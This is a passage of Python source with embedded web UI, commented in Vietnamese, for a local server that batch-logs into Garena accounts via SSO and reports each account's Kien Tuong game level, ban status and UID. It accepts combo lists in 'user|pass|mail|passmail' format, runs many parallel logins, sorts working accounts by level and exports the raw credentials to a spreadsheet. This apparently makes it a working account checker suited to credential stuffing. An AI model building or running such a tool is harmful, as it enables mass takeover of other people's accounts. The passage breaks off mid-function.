<form id="f" autocomplete="off"><input id="credential" type="password" maxlength="1200" autocomplete="off" placeholder="user|pass hoặc user|pass|mail|passmail" required>
<button id="b" type="submit">Chạy kiểm tra API</button></form>
<pre id="out">Chưa thực hiện.</pre>
<small class="warn">Không vượt CAPTCHA/2FA. Email được hiển thị theo yêu cầu; SĐT, giấy tờ vẫn được che. Session Key SSO hiển thị khi đăng nhập thành công. Chỉ chạy tại 127.0.0.1.</small>
</div>

<div class="card" id="historyCard">
<h2>Lịch sử check</h2>
<div id="historyStatus" class="fileinfo">Đang tải...</div>
<div id="historyList"></div>
</div>

</main>
<script>
const token=__TOKEN__;
const $=id=>document.getElementById(id);
function esc(s){return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
async function postJson(url,body){try{const r=await fetch(url,{method:'POST',cache:'no-store',credentials:'same-origin',headers:{'Content-Type':'application/json','X-API-Test-Token':token},body:JSON.stringify(body)});return await r.json();}catch(e){return{ok:false,error:'Lỗi localhost: '+e}}}
async function getState(){const r=await fetch('/api/batch/state',{cache:'no-store',credentials:'same-origin',headers:{'X-API-Test-Token':token}});return r.json();}
 let pollTimer=null,rendered=0,lastRows=[],batchFileText='',batchFileName='',selectedHistoryRunId=null;
function setStatus(t,bad){const el=$('batchStatus');el.textContent=t;el.className=bad?'bad':'';}
function formatDuration(ms){const total=Math.max(0,Math.round((Number(ms)||0)/1000)),h=Math.floor(total/3600),m=Math.floor((total%3600)/60),s=total%60;return(h?h+' giờ ':'')+String(m).padStart(2,'0')+' phút '+String(s).padStart(2,'0')+' giây';}
function updateTiming(s){const elapsed=Number(s.elapsed_ms)||0,done=s.rows.length,total=Number(s.total)||0;let text='Thời gian: '+formatDuration(elapsed);if(s.running&&done>0&&total>done){const eta=Math.max(0,Math.round(elapsed/done*(total-done)));text+=' · Ước còn '+formatDuration(eta);}else if(!s.running&&done){text+=' · Đã hoàn tất';}$('batchTiming').textContent=text;}
function renderRows(rows){const tb=$('batchBody');for(let i=rendered;i<rows.length;i++){const r=rows[i],tr=document.createElement('tr');tr.className=r.status==='OK'?'ok':'fail';const badge='<span class="badge">'+esc(r.status)+'</span>';tr.innerHTML='<td>'+esc(r.stt)+'</td><td>'+esc(r.account)+'</td><td>'+badge+'</td><td>'+[r.uid,r.name,r.level,r.player_status,r.elapsed_ms].map(esc).join('</td><td>')+'</td>';tb.appendChild(tr);}rendered=rows.length;lastRows=rows;}
async function poll(){try{const s=await getState();if(!s||!s.ok)return;renderRows(s.rows);updateTiming(s);const done=s.rows.length;setStatus(s.running?('Đang chạy: '+done+'/'+s.total+'...'):('Xong: '+done+'/'+s.total+(s.stopped?' (đã dừng sớm)':'')),false);if(s.rows.length) $('exportXlsxBtn').disabled=false;if(!s.running){if(pollTimer){clearInterval(pollTimer);pollTimer=null;}$('batchStart').disabled=false;}}catch(e){}}
function renderSplitTable(tbodyId,rows){const tb=$(tbodyId);tb.innerHTML='';rows.forEach(r=>{const tr=document.createElement('tr');tr.className=r.status==='OK'?'ok':'fail';const badge='<span class="badge">'+esc(r.status)+'</span>';tr.innerHTML='<td>'+esc(r.stt)+'</td><td>'+esc(r.account)+'</td><td>'+badge+'</td><td>'+[r.uid,r.name,r.level,r.player_status,r.elapsed_ms].map(esc).join('</td><td>')+'</td>';tb.appendChild(tr);});}
$('splitBtn').addEventListener('click',()=>{
 if(!lastRows.length){setStatus('Chưa có kết quả batch để chia lọc',true);return;}
 const lv=parseInt($('requiredLevel').value,10)||12;
 const met=[],notMet=[];
 lastRows.forEach(r=>{const level=String(r.level||'').trim();if(/^\d+$/.test(level)&&Number(level)>=lv)met.push(r);else notMet.push(r);});
 $('splitSection').style.display='block';
 $('splitTitle').textContent='Chia lọc theo cấp độ >= '+lv;
 $('metCount').textContent=met.length;
 $('notMetCount').textContent=notMet.length;
 renderSplitTable('metBody',met);
 renderSplitTable('notMetBody',notMet);
 setStatus('Đã chia lọc: '+met.length+' đạt, '+notMet.length+' không đạt',false);
});
$('exportXlsxBtn').addEventListener('click',async()=>{
  if(!lastRows.length && !selectedHistoryRunId){setStatus('Chưa có kết quả batch để xuất',true);return;}
 const lv=parseInt($('requiredLevel').value,10)||12;
 setStatus('Đang tạo file XLSX...',false);
 try{
  const res=await fetch('/api/batch/export-xlsx',{method:'POST',cache:'no-store',credentials:'same-origin',headers:{'Content-Type':'application/json','X-API-Test-Token':token},body:JSON.stringify({required_level:lv,run_id:selectedHistoryRunId||0})});
  if(!res.ok){const j=await res.json().catch(()=>({}));setStatus(j.error||'Lỗi xuất XLSX',true);return;}
  const blob=await res.blob();const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='ketqua_cap_do.xlsx';document.body.appendChild(a);a.click();a.remove();setTimeout(()=>URL.revokeObjectURL(a.href),2000);setStatus('Đã tải file XLSX',false);
 }catch(e){setStatus('Lỗi xuất: '+e,true);}
});
$('batchStart').addEventListener('click',async()=>{
 const accounts=batchFileText||$('batchAccounts').value;
 const res=await postJson('/api/batch/start',{accounts,workers:parseInt($('batchWorkers').value,10)||2,gap:parseFloat($('batchGap').value)||0,required_level:parseInt($('requiredLevel').value,10)||12});
 if(!res.ok){setStatus(res.error||'Không bắt đầu được',true);return;}
 $('batchBody').innerHTML='';rendered=0;lastRows=[];selectedHistoryRunId=null;$('batchStart').disabled=true;setStatus('Đang chạy...',false);$('batchTiming').textContent='Thời gian: 00 phút 00 giây';
 if(pollTimer)clearInterval(pollTimer);pollTimer=setInterval(poll,900);poll();});
$('batchStop').addEventListener('click',()=>{postJson('/api/batch/stop',{});setStatus('Đang dừng sau các acc đang xử lý...',false);});
$('batchAccounts').addEventListener('input',()=>{if($('batchAccounts').value){batchFileText='';batchFileName='';$('batchFileName').textContent='Chưa chọn file (đang dùng nội dung nhập tay).';}});
$('batchImport').addEventListener('change',ev=>{const f=ev.target.files&&ev.target.files[0];if(!f)return;const rd=new FileReader();rd.onload=()=>{batchFileText=String(rd.result||'');batchFileName=f.name;$('batchAccounts').value='';$('batchFileName').textContent='Đã chọn file: '+batchFileName;setStatus('Đã nạp file, nội dung được giữ ẩn.',false);};rd.onerror=()=>{batchFileText='';batchFileName='';$('batchFileName').textContent='Không đọc được file.';setStatus('Không đọc được file đã chọn.',true);};rd.readAsText(f,'utf-8');ev.target.value='';});
$('batchExport').addEventListener('click',()=>{
 if(!lastRows.length){setStatus('Chưa có kết quả để xuất',true);return;}
   const cols=['stt','account','status','uid','name','level','player_status','deletion_status','elapsed_ms'];
 const q=v=>{v=String(v==null?'':v);return /[",\n\r]/.test(v)?'"'+v.replace(/"/g,'""')+'"':v;};
 const csv='\ufeff'+cols.join(',')+'\n'+lastRows.map(r=>cols.map(c=>q(r[c])).join(',')).join('\r\n');
 const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([csv],{type:'text/csv;charset=utf-8'}));a.download='ketqua_batch.csv';document.body.appendChild(a);a.click();a.remove();setTimeout(()=>URL.revokeObjectURL(a.href),2000);});
$('f').addEventListener('submit',async ev=>{ev.preventDefault();const b=$('b'),out=$('out'),input=$('credential');
 b.disabled=true;out.className='';out.textContent='Đang kiểm tra tài khoản Garena và hồ sơ Kiện Tướng...';
 const data=await postJson('/api/test',{credential:input.value});
 out.className=data.ok?'ok':'bad';out.textContent=data.display||data.error||'Không có kết quả';
 input.value='';b.disabled=false;});
(async function resume(){try{const s=await getState();if(!s||!s.ok)return;if(s.running||s.rows.length){renderRows(s.rows);setStatus(s.running?('Đang chạy: '+s.rows.length+'/'+s.total+'...'):('Lần trước: '+s.rows.length+'/'+s.total+(s.stopped?' (đã dừng sớm)':'')),false);$('batchStart').disabled=!!s.running;if(s.rows.length) $('exportXlsxBtn').disabled=false;if(s.running&&!pollTimer)pollTimer=setInterval(poll,900);}}catch(e){}})();
async function loadHistory(){
 try{
  const r=await fetch('/api/history',{cache:'no-store',credentials:'same-origin',headers:{'X-API-Test-Token':token}});
  const d=await r.json();
  if(!d.ok||!d.db_available){$('historyStatus').textContent='Database chưa kết nối (cần TURSO_URL + TURSO_TOKEN)';$('historyList').innerHTML='';return;}
  if(!d.runs||!d.runs.length){$('historyStatus').textContent='Chưa có lịch sử.';$('historyList').innerHTML='';return;}
  $('historyStatus').textContent='Tổng: '+d.runs.length+' lần check';
  let h='<table style="width:100%;border-collapse:collapse;font-size:13px">';
  h+='<tr style="color:#8b949e"><th style="padding:6px;text-align:left">ID</th><th>Thời gian</th><th>Tổng</th><th>Đạt</th><th>Không đạt</th><th>Cấp YT</th><th>ms</th><th></th><th></th></tr>';
  d.runs.forEach(r=>{
   const dt=new Date(r.created_at*1000);const ts=dt.toLocaleDateString('vi-VN')+' '+dt.toLocaleTimeString('vi-VN');
   h+='<tr style="border-top:1px solid #21262d"><td style="padding:6px">'+r.id+'</td><td>'+ts+'</td><td>'+r.total+'</td><td style="color:#56d364">'+r.met+'</td><td style="color:#ff7b72">'+r.not_met+'</td><td>>='+r.required_level+'</td><td>'+r.elapsed_ms+'</td>';
   h+='<td><button onclick="viewHistory('+r.id+')" style="padding:3px 8px;border:0;border-radius:4px;background:#238636;color:#fff;cursor:pointer;font-size:12px">Xem</button></td>';
   h+='<td><button onclick="deleteHistory('+r.id+')" style="padding:3px 8px;border:0;border-radius:4px;background:#da3633;color:#fff;cursor:pointer;font-size:12px">Xóa</button></td></tr>';
  });
  h+='</table><button onclick="deleteAllHistory()" style="margin-top:8px;padding:6px 12px;border:0;border-radius:6px;background:#da3633;color:#fff;cursor:pointer;font-size:12px">Xóa tất cả lịch sử</button>';
  $('historyList').innerHTML=h;
 }catch(e){$('historyStatus').textContent='Lỗi tải lịch sử: '+e;}
}
async function viewHistory(id){
 try{
  const r=await fetch('/api/history/'+id,{cache:'no-store',credentials:'same-origin',headers:{'X-API-Test-Token':token}});
  const d=await r.json();
  if(!d.ok){alert('Không đọc được');return;}
   lastRows=d.rows;selectedHistoryRunId=id;rendered=0;$('batchBody').innerHTML='';renderRows(d.rows);
  setStatus('Đã tải lịch sử #'+id+': '+d.rows.length+' acc',false);
  window.scrollTo({top:0,behavior:'smooth'});
 }catch(e){alert('Lỗi: '+e);}
}
async function deleteHistory(id){
 if(!confirm('Xóa lịch sử #'+id+'?'))return;
 await postJson('/api/history/'+id,{});loadHistory();
}
async function deleteAllHistory(){
 if(!confirm('Xóa TẤT CẢ lịch sử?'))return;
 await fetch('/api/history/all',{method:'POST',cache:'no-store',credentials:'same-origin',headers:{'Content-Type':'application/json','X-API-Test-Token':token},body:JSON.stringify({confirm:true})});
 loadHistory();
}
loadHistory();
</script></body></html>'''


def page_html(csrf_token: str) -> bytes:
    token_js = json.dumps(csrf_token)
    return PAGE_TEMPLATE.replace("__TOKEN__", token_js).encode("utf-8")


class BatchServerState:
    """Batch state shared by every local HTTP listening port."""

    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.running = False
        self.stopped = threading.Event()
        self.total = 0
        self.rows: list[dict[str, str]] = []
        self.started_at = 0.0
        self.elapsed_ms = 0
        self.required_level = 12


class ApiTestServer(tcp_ui.LoginTestServer):
    def __init__(
        self,
        *args: Any,
        batch_state: BatchServerState | None = None,
        **kwargs: Any,
    ) -> None:
        super().__init__(*args, **kwargs)
        self.batch_state = batch_state or BatchServerState()

    batch_lock = property(lambda self: self.batch_state.lock)
    batch_stopped = property(lambda self: self.batch_state.stopped)
    batch_running = property(
        lambda self: self.batch_state.running,
        lambda self, value: setattr(self.batch_state, "running", value),
    )
    batch_total = property(
        lambda self: self.batch_state.total,
        lambda self, value: setattr(self.batch_state, "total", value),
    )
    batch_rows = property(
        lambda self: self.batch_state.rows,
        lambda self, value: setattr(self.batch_state, "rows", value),
    )
    batch_started_at = property(
        lambda self: self.batch_state.started_at,
        lambda self, value: setattr(self.batch_state, "started_at", value),
    )
    batch_elapsed_ms = property(
        lambda self: self.batch_state.elapsed_ms,
        lambda self, value: setattr(self.batch_state, "elapsed_ms", value),
    )
    batch_required_level = property(
        lambda self: self.batch_state.required_level,
        lambda self, value: setattr(self.batch_state, "required_level", value),
    )


class Handler(BaseHTTPRequestHandler):
    server: ApiTestServer

    def log_message(self, _format: str, *args: Any) -> None:
        return

    def handle_one_request(self) -> None:
        try:
            super().handle_one_request()
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass

    def handle(self) -> None:
        try:
            super().handle()
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass

    def authorized(self) -> bool:
        expected = os.environ.get("API_TEST_PASSWORD", "")
        if not expected:
            return True
        header = self.headers.get("Authorization", "")
        if not header.startswith("Basic "):
            return False
        try:
            decoded = base64.b64decode(header[6:].strip()).decode("utf-8")
        except (ValueError, UnicodeDecodeError):
            return False
        _, _, password = decoded.partition(":")
        return secrets.compare_digest(password, expected)

    def deny_access(self) -> None:
        body = json.dumps(
            {"ok": False, "error": "Cần mật khẩu truy cập"}, ensure_ascii=False
        ).encode("utf-8")
        self.send_response(HTTPStatus.UNAUTHORIZED)
        self.send_header("WWW-Authenticate", 'Basic realm="Garena API Test", charset="UTF-8"')
        self.security_headers("application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def security_headers(self, content_type: str) -> None:
        self.send_header("Content-Type", content_type)
        self.send_header("Cache-Control", "no-store, max-age=0")
        self.send_header("Pragma", "no-cache")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Referrer-Policy", "no-referrer")
        self.send_header("Content-Security-Policy", "default-src 'none';style-src 'unsafe-inline';script-src 'unsafe-inline';connect-src 'self';frame-ancestors 'none';form-action 'self'")

    def send_json(self, status: HTTPStatus, value: dict[str, Any]) -> None:
        try:
            body = json.dumps(value, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
            self.send_response(status);self.security_headers("application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(body)));self.end_headers();self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass

    def do_GET(self) -> None:
        if self.path in ("/", "/api/batch/state") and not self.authorized():
            self.deny_access();return
        if self.path == "/favicon.ico":
            self.send_response(HTTPStatus.NO_CONTENT);self.end_headers();return
        if self.path.startswith("/api/history"):
            if not self.authorized():self.deny_access();return
            if self.headers.get("X-API-Test-Token", "") != self.server.csrf_token:
                self.send_json(HTTPStatus.FORBIDDEN, {"ok": False, "error": "CSRF token không hợp lệ"});return
            parts = self.path.strip("/").split("/")
            if len(parts) == 3 and parts[1] == "history" and parts[2].isdigit():
                run_id = int(parts[2])
                rows = db.get_run_rows(run_id)
                self.send_json(HTTPStatus.OK, {"ok": True, "rows": rows});return
            runs = db.list_runs()
            self.send_json(HTTPStatus.OK, {"ok": True, "runs": runs, "db_available": db.is_available()});return
        if self.path == "/api/batch/state":
            if self.headers.get("X-API-Test-Token", "") != self.server.csrf_token:
                self.send_json(HTTPStatus.FORBIDDEN, {"ok": False, "error": "CSRF token không hợp lệ"});return
            with self.server.batch_lock:
                elapsed_ms = self.server.batch_elapsed_ms
                if self.server.batch_running and self.server.batch_started_at:
                    elapsed_ms = round(
                        (time.monotonic() - self.server.batch_started_at) * 1000
                    )
                payload = {
                    "ok": True,
                    "running": self.server.batch_running,
                    "stopped": self.server.batch_stopped.is_set(),
                    "total": self.server.batch_total,
                    "elapsed_ms": elapsed_ms,
                    "rows": [public_batch_row(row) for row in self.server.batch_rows],
                }
            self.send_json(HTTPStatus.OK, payload);return
        if self.path != "/":
            self.send_error(HTTPStatus.NOT_FOUND);return
        body = page_html(self.server.csrf_token)
        self.send_response(HTTPStatus.OK);self.security_headers("text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)));self.end_headers();self.wfile.write(body)

    def do_POST(self) -> None:
        if not self.authorized():
            self.deny_access();return
        if self.path == "/api/batch/start":
            if self.headers.get("X-API-Test-Token", "") != self.server.csrf_token:
                self.send_json(HTTPStatus.FORBIDDEN, {"ok": False, "error": "CSRF token không hợp lệ"});return
            try:length=int(self.headers.get("Content-Length", "0"))
            except ValueError:length=0
            if length <= 0 or length > MAX_BATCH_BODY:
                if length>0:
                    try:
                        rem=length
                        while rem>0:
                            chunk=self.rfile.read(min(rem, 64*1024))
                            if not chunk: break
                            rem-=len(chunk)
                    except: pass
                self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "Kích thước request không hợp lệ"});return
            try:
                body=json.loads(self.rfile.read(length).decode("utf-8"))
                accounts_text=str(body.get("accounts", ""))
                workers=int(body.get("workers", 2))
                gap=float(body.get("gap", 3.0))
                required_level=int(body.get("required_level", 12))
            except (UnicodeDecodeError, json.JSONDecodeError, TypeError, ValueError):
                self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "JSON không hợp lệ"});return
            if not 1 <= workers <= 9999:
                self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "Số luồng phải trong khoảng 1..9999"});return
            if not 0 <= gap <= 60:
                self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "Gap phải trong khoảng 0..60 giây"});return
            try:
                credentials = parse_credentials_text(accounts_text)
            except ValueError as exc:
                self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": str(exc)});return
            with self.server.batch_lock:
                if self.server.batch_running:
                    self.send_json(HTTPStatus.CONFLICT, {"ok": False, "error": "Đang có batch chạy; hãy Dừng hoặc chờ xong"});return
                self.server.batch_rows = []
                self.server.batch_total = len(credentials)
                self.server.batch_stopped.clear()
                self.server.batch_started_at = time.monotonic()
                self.server.batch_elapsed_ms = 0
                self.server.batch_running = True
                self.server.batch_required_level = required_level
            threading.Thread(
                target=_batch_worker,
                args=(self.server, credentials, workers, gap),
                daemon=True,
                name="sso-batch-runner",
            ).start()
            self.send_json(HTTPStatus.OK, {"ok": True, "total": len(credentials)});return

        if self.path == "/api/batch/stop":
            if self.headers.get("X-API-Test-Token", "") != self.server.csrf_token:
                self.send_json(HTTPStatus.FORBIDDEN, {"ok": False, "error": "CSRF token không hợp lệ"});return
            self.server.batch_stopped.set()
            self.send_json(HTTPStatus.OK, {"ok": True});return

        if self.path.startswith("/api/history/"):
            if not self.authorized():self.deny_access();return
            if self.headers.get("X-API-Test-Token", "") != self.server.csrf_token:
                self.send_json(HTTPStatus.FORBIDDEN, {"ok": False, "error": "CSRF token không hợp lệ"});return
            parts = self.path.strip("/").split("/")
            if len(parts) == 3 and parts[2].isdigit():
                db.delete_run(int(parts[2]))
                self.send_json(HTTPStatus.OK, {"ok": True});return
            if self.path == "/api/history/all" and self.headers.get("Content-Length", "0") != "0":
                length = int(self.headers.get("Content-Length", "0"))
                body = json.loads(self.rfile.read(length).decode("utf-8"))
                if body.get("confirm") == True:
                    db.delete_all_runs()
                    self.send_json(HTTPStatus.OK, {"ok": True});return
            self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "Yêu cầu không hợp lệ"});return

        if self.path == "/api/batch/split":
            if self.headers.get("X-API-Test-Token", "") != self.server.csrf_token:
                self.send_json(HTTPStatus.FORBIDDEN, {"ok": False, "error": "CSRF token không hợp lệ"});return
            try:length=int(self.headers.get("Content-Length", "0"))
            except ValueError:length=0
            if length<=0 or length>MAX_BODY:
                if length>0:
                    try:
                        rem=length
                        while rem>0:
                            chunk=self.rfile.read(min(rem, 64*1024))
                            if not chunk: break
                            rem-=len(chunk)
                    except: pass
                self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "Kích thước request không hợp lệ"});return
            try:
                body=json.loads(self.rfile.read(length).decode("utf-8"))
                required_level=int(body.get("required_level",12))
            except (UnicodeDecodeError,json.JSONDecodeError,TypeError,ValueError):
                self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "JSON không hợp lệ"});return
            with self.server.batch_lock:
                rows=[public_batch_row(r) for r in self.server.batch_rows]
            met,not_met=[],[]
            for r in rows:
                lv=r.get("level","").strip()
                if lv.isdigit() and int(lv)>=required_level:
                    met.append(r)
                else:
                    not_met.append(r)
            self.send_json(HTTPStatus.OK,{"ok":True,"met":met,"not_met":not_met,"required_level":required_level});return

        if self.path == "/api/batch/export-xlsx":
            if self.headers.get("X-API-Test-Token", "") != self.server.csrf_token:
                self.send_json(HTTPStatus.FORBIDDEN, {"ok": False, "error": "CSRF token không hợp lệ"});return
            try:length=int(self.headers.get("Content-Length", "0"))
            except ValueError:length=0
            if length<=0 or length>MAX_BODY:
                if length>0:
                    try:
                        rem=length
                        while rem>0:
                            chunk=self.rfile.read(min(rem, 64*1024))
                            if not chunk: break
                            rem-=len(chunk)
                    except: pass
                self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "Kích thước request không hợp lệ"});return
            try:
                body=json.loads(self.rfile.read(length).decode("utf-8"))
                required_level=int(body.get("required_level",12))
                run_id=int(body.get("run_id") or 0)
            except (UnicodeDecodeError,json.JSONDecodeError,TypeError,ValueError):
                self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "JSON không hợp lệ"});return
            if run_id > 0:
                rows=db.get_run_rows_for_export(run_id)
            else:
                with self.server.batch_lock:
                    rows=[dict(r) for r in self.server.batch_rows]
            met,not_met,locked,special,failed=[],[],[],[],[]
            for r in rows:
                if str(r.get("status") or "").upper() == "FAIL":
                    failed.append(r)
                    continue
                # Special accounts have neither Garena Account Center nor
                # Kien Tuong data. Keep them exclusively in their own sheet
                # instead of also classifying their empty level as not met.
                if str(r.get("_special") or "") == "1":
                    special.append(r)
                    continue
                if str(r.get("player_status") or "").strip() == "Bị khóa":
                    locked.append(r)
                    continue
                lv=r.get("level","").strip()
                if lv.isdigit() and int(lv)>=required_level:
                    met.append(r)
                else:
                    not_met.append(r)
            try:
                import openpyxl, re
                from openpyxl.styles import Font,PatternFill,Alignment
                wb=openpyxl.Workbook()
                header_font=Font(bold=True,color="FFFFFF")
                header_fill=PatternFill(start_color="238636",end_color="238636",fill_type="solid")
                not_met_fill=PatternFill(start_color="9e6a03",end_color="9e6a03",fill_type="solid")
                locked_fill=PatternFill(start_color="c2410c",end_color="c2410c",fill_type="solid")
                special_fill=PatternFill(start_color="8250df",end_color="8250df",fill_type="solid")
                failed_fill=PatternFill(start_color="da3633",end_color="da3633",fill_type="solid")
                col_names=["stt","account","status","uid","name","level","player_status","deletion_status","elapsed_ms"]
                col_labels=["STT","Tài khoản","Trạng thái","UID Garena","Tên Kiện Tướng","Cấp","Trạng thái KT","Yêu cầu xóa","ms"]
                sheets=[
                    (0,met,"Đạt",header_fill),
                    (1,not_met,"Không đạt",not_met_fill),
                    (2,locked,"Bị khóa",locked_fill),
                    (3,special,"Đặc biệt",special_fill),
                    (4,failed,"FAIL",failed_fill),
                ]
                for idx,data_list,label,fill in sheets:
                    ws=wb.active if idx==0 else wb.create_sheet()
                    ws.title=label
                    for c,col_label in enumerate(col_labels,1):
                        cell=ws.cell(row=1,column=c,value=col_label)
                        cell.font=header_font;cell.fill=fill;cell.alignment=Alignment(horizontal="center")
                    for ri,row in enumerate(data_list,2):
                        for ci,col_name in enumerate(col_names,1):
                            value=row.get(col_name,"")
                            if col_name == "account":
                                value=row.get("_credential") or value
                            if isinstance(value, str):
                                value=re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F]', '', value)
                            ws.cell(row=ri,column=ci,value=value)
                    for c in range(1,len(col_labels)+1):
                        ws.column_dimensions[openpyxl.utils.get_column_letter(c)].width=max(12,len(col_labels[c-1])+2)
                import io
                buf=io.BytesIO();wb.save(buf);buf.seek(0)
                xlsx_bytes=buf.read()
                self.send_response(HTTPStatus.OK)
                self.send_header("Content-Type","application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
                self.send_header("Content-Disposition","attachment; filename=ketqua_cap_do.xlsx")
                self.send_header("Content-Length",str(len(xlsx_bytes)))
                self.security_headers("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
                self.end_headers();self.wfile.write(xlsx_bytes)
            except Exception as exc:
                self.send_json(HTTPStatus.INTERNAL_SERVER_ERROR,{"ok":False,"error":(str(exc).strip() or type(exc).__name__)[:500]})
            return

        if self.path != "/api/test":
            self.send_json(HTTPStatus.NOT_FOUND, {"ok": False, "error": "Endpoint không tồn tại"});return
        if self.headers.get("X-API-Test-Token", "") != self.server.csrf_token:
            self.send_json(HTTPStatus.FORBIDDEN, {"ok": False, "error": "CSRF token không hợp lệ"});return
        try:length=int(self.headers.get("Content-Length", "0"))
        except ValueError:length=0
        if length <= 0 or length > MAX_BODY:
            if length>0:
                try:
                    rem=length
                    while rem>0:
                        chunk=self.rfile.read(min(rem, 64*1024))
                        if not chunk: break
                        rem-=len(chunk)
                except: pass
            self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "Kích thước request không hợp lệ"});return
        try:
            body=json.loads(self.rfile.read(length).decode("utf-8"));credential=str(body.get("credential", "")).strip()
            if "|" in credential:
                parts=credential.split("|")
                if len(parts) < 2:
                    raise ValueError("invalid format")
                account=parts[0].strip();password=parts[1].strip()
            elif credential.count(":") == 1:
                account,password=credential.split(":",1);account=account.strip();password=password.strip()
            else:
                raise ValueError("invalid format")
        except (UnicodeDecodeError,json.JSONDecodeError,AttributeError,ValueError):
            self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "Nhập đúng định dạng user|pass, user|pass|mail hoặc user|pass|mail|passmail (hoặc user:pass)"});return
        if not account or not password or len(account)>128 or len(password)>1024:
            self.send_json(HTTPStatus.BAD_REQUEST, {"ok": False, "error": "Tài khoản/mật khẩu trống hoặc quá dài"});return
        if not TEST_LOCK.acquire(blocking=False):
            self.send_json(HTTPStatus.TOO_MANY_REQUESTS, {"ok": False, "error": "Đang có lần kiểm tra khác"});return
        try:
            result=run_api_tests(self.server.tcp_module,account,password,self.server.tcp_timeout)
            rejected=bool((result.get("tcp") or {}).get("credential_rejected"))
            self.send_json(HTTPStatus.OK, {"ok": not rejected, "display": format_user_output(result)})
        except Exception as exc:
            self.send_json(HTTPStatus.OK, {"ok": False, "error": (str(exc).strip() or type(exc).__name__)[:500]})
        finally:
            credential=account=password="";TEST_LOCK.release()


def parse_args() -> argparse.Namespace:
    parser=argparse.ArgumentParser(description="Kiểm tra tài khoản Garena và hồ sơ Kiện Tướng")
    parser.add_argument(
        "--port",
        dest="ports",
        action="append",
        type=int,
        help="Cổng HTTP; lặp tùy chọn để mở nhiều cổng (mặc định local: 5555)",
    )
    parser.add_argument("--timeout",type=float,default=20.0,help="Timeout mỗi request, 1..60 giây")
    parser.add_argument("--no-browser",action="store_true",help="Không tự mở Chrome")
    parser.add_argument("--self-test",action="store_true",help="Kiểm tra source/hash, không đăng nhập")
    parser.add_argument(
        "--sso-diagnostics",
        action="store_true",
        help="Check SSO DNS/TCP/TLS/HTTP without sending credentials or tokens",
    )
    parser.add_argument("--file",type=Path,default=None,help="Chạy batch: file UTF-8 dạng user|pass, user|pass|mail hoặc user|pass|mail|passmail (hoặc user:pass), mỗi dòng một tài khoản; chỉ dùng user|pass để kiểm tra")
    parser.add_argument("--workers",type=int,default=2,help="Số luồng song song khi batch, 1..8 (mặc định 2)")
    parser.add_argument("--start-gap",type=float,default=3.0,help="Giãn cách tối thiểu giữa hai lần bắt đầu đăng nhập SSO, giây (mặc định 3)")
    parser.add_argument("--csv",type=Path,default=None,help="Ghi kết quả batch ra file CSV này (mã hóa utf-8-sig)")
    return parser.parse_args()


def configured_server_ports(
    cli_ports: list[int] | None,
    *,
    port_env: str = "",
    ports_env: str = "",
    render: bool = False,
) -> list[int]:
    """Resolve unique listening ports while preserving the configured order."""

    if render and port_env.strip():
        raw_values = [port_env]
    elif cli_ports:
        raw_values = [str(port) for port in cli_ports]
    elif ports_env.strip():
        raw_values = ports_env.replace(";", ",").replace(" ", ",").split(",")
    elif port_env.strip():
        raw_values = [port_env]
    else:
        raw_values = ["5555"]

    ports: list[int] = []
    for raw_value in raw_values:
        if not str(raw_value).strip():
            continue
        try:
            port = int(str(raw_value).strip())
        except ValueError as exc:
            raise ValueError(f"Port không hợp lệ: {raw_value}") from exc
        if not 1024 <= port <= 65535:
            raise ValueError(f"Port phải trong khoảng 1024..65535: {port}")
        if port not in ports:
            ports.append(port)
    if not ports:
        raise ValueError("Danh sách port trống")
    return ports


def main() -> int:
    tcp_ui.configure_console_encoding();args=parse_args()
    if args.file:
        if not 1<=args.workers<=8:raise SystemExit("--workers phải trong khoảng 1..8")
        if not 0<=args.start_gap<=60:raise SystemExit("--start-gap phải trong khoảng 0..60 giây")
        return run_batch(args)
    is_render=bool(os.environ.get("RENDER"))
    host=os.environ.get("HOST","0.0.0.0" if is_render else "127.0.0.1").strip() or "127.0.0.1"
    try:
        ports=configured_server_ports(
            args.ports,
            port_env=os.environ.get("PORT", ""),
            ports_env=os.environ.get("PORTS", ""),
            render=is_render,
        )
    except ValueError as exc:
        raise SystemExit(str(exc)) from exc
    if not 1.0<=args.timeout<=60.0:raise SystemExit("Timeout phải trong khoảng 1..60 giây")
    if args.sso_diagnostics:
        result = public_sso_diagnostics(args.timeout)
        print(json.dumps(result, ensure_ascii=False, indent=2))
        if not args.no_browser:
            tcp_ui.open_chrome_or_default(SSO_LOGIN_URL)
        return 0 if result.get("ok") else 1
    tcp_module=tcp_ui.load_verified_tcp_module()
    if args.self_test:
        expected = "b0494ef53b7b15eebbefd763d56dbf5f"
        actual = garena_web_password("test-password", "v1-example", "v2-example")
        if actual != expected:
            raise SystemExit("SELF-TEST FAIL: Garena web password transform")
        if redact_tree({"code": "secret"})["code"] == "secret":
            raise SystemExit("SELF-TEST FAIL: OAuth code redaction")
        if kientuong_player_has_level({"ok": True, "body": {"data": {}}}):
